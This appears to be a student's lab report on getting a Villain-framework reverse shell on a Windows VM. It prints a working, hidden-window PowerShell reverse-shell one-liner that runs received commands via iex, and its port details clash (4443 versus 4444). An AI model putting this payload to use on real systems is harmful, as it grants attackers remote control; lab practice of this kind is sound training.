# Villain Framework Reverse Shell Report

## ⚙️ Setup Info
- Payload: `Start-Process $PSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden
`
- LHOST: 192.168.56.101
- LPORT: 4444

## 🔁 Payload Delivery Method
-
    To deliver the payload, I executed the reverse shell command directly inside the target Windows VM using **PowerShell**.  
    - First, I opened PowerShell on the Windows machine.  
    - Then, I pasted the payload command that was generated in Villain, which established a reverse TCP connection to my Kali VM.  
    - The payload connected back to my listener (`LHOST` and `LPORT` configured in Villain), giving me an interactive shell session from the target machine.  

    This simulated the attacker’s method of manually executing a malicious payload on the victim system.

## 🖥️ Captured Info
- Hostname: administrator/user
- IP Address: 192.168.56.1
- User: user

## 🔎 Enumeration Performed
```powershell
whoami
ipconfig
systeminfo